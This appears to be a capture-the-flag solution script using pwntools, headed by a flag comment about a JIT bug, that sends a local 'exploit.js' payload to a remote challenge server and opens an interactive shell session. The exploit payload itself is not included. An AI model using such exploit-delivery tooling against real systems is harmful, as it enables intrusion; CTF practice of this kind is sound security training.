#inctf{JIT_t0o_f4st_1t_g0t_c0nfus3d}
from pwn import *

target = remote('pwn.challenge.bi0s.in', 1212)

file = open("exploit.js", "r")
data = file.read()

#target.recvuntil("5k:")
target.sendline(str(len(data)))
#target.recvuntil("please!!")
target.send(data)
target.interactive()
